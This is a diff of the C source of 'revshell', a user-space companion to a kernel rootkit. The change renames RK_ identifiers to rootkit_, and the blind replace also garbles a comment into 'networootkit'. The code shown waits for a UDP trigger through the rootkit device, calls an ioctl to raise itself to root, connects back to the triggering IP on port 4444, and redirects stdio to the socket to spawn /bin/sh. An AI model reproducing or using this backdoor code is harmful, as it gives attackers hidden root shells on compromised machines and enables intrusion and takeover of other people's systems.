@@ -11,25 +11,25 @@
 #include "interface.h"
 
 int main(void) {
-    printf("[revshell] Started. Attempting to open /dev/%s...\n", RK_DEV_NAME);
+    printf("[revshell] Started. Attempting to open /dev/%s...\n", rootkit_DEV_NAME);
     fflush(stdout);
 
-    int dev_fd = open("/dev/" RK_DEV_NAME, O_RDWR);
+    int dev_fd = open("/dev/" rootkit_DEV_NAME, O_RDWR);
     if (dev_fd < 0) {
-        perror("[revshell] ERROR: Failed to open /dev/" RK_DEV_NAME);
+        perror("[revshell] ERROR: Failed to open /dev/" rootkit_DEV_NAME);
         return 1;
     }
 
-    printf("[revshell] Device /dev/%s opened successfully (fd=%d).\n", RK_DEV_NAME, dev_fd);
-    printf("[revshell] Waiting in kernel space for UDP trigger (RK_IOCTL_WAIT_REMOTE)...\n");
+    printf("[revshell] Device /dev/%s opened successfully (fd=%d).\n", rootkit_DEV_NAME, dev_fd);
+    printf("[revshell] Waiting in kernel space for UDP trigger (rootkit_IOCTL_WAIT_REMOTE)...\n");
     fflush(stdout);
 
     struct in_addr remote_ip;
     memset(&remote_ip, 0, sizeof(remote_ip));
 
     /* Wait in kernel space until UDP trigger packet arrives */
-    if (ioctl(dev_fd, RK_IOCTL_WAIT_REMOTE, &remote_ip) < 0) {
-        perror("[revshell] ERROR: ioctl RK_IOCTL_WAIT_REMOTE failed");
+    if (ioctl(dev_fd, rootkit_IOCTL_WAIT_REMOTE, &remote_ip) < 0) {
+        perror("[revshell] ERROR: ioctl rootkit_IOCTL_WAIT_REMOTE failed");
         close(dev_fd);
         return 1;
     }
@@ -40,12 +40,12 @@ int main(void) {
     }
 
     printf("[revshell] TRIGGER RECEIVED! Remote IP: %s\n", ip_str);
-    printf("[revshell] Requesting root privilege elevation (RK_IOCTL_ELEVATE)...\n");
+    printf("[revshell] Requesting root privilege elevation (rootkit_IOCTL_ELEVATE)...\n");
     fflush(stdout);
 
     /* Elevate credentials to root (UID 0, GID 0) */
-    if (ioctl(dev_fd, RK_IOCTL_ELEVATE, 0) < 0) {
-        perror("[revshell] ERROR: ioctl RK_IOCTL_ELEVATE failed");
+    if (ioctl(dev_fd, rootkit_IOCTL_ELEVATE, 0) < 0) {
+        perror("[revshell] ERROR: ioctl rootkit_IOCTL_ELEVATE failed");
         close(dev_fd);
         return 1;
     }
@@ -81,7 +81,7 @@ int main(void) {
     printf("[revshell] Connected to %s:4444! Redirecting stdio and spawning /bin/sh...\n", ip_str);
     fflush(stdout);
 
-    /* Redirect stdin, stdout, stderr to network socket */
+    /* Redirect stdin, stdout, stderr to networootkit socket */
     dup2(sock, 0);
     dup2(sock, 1);
     dup2(sock, 2);
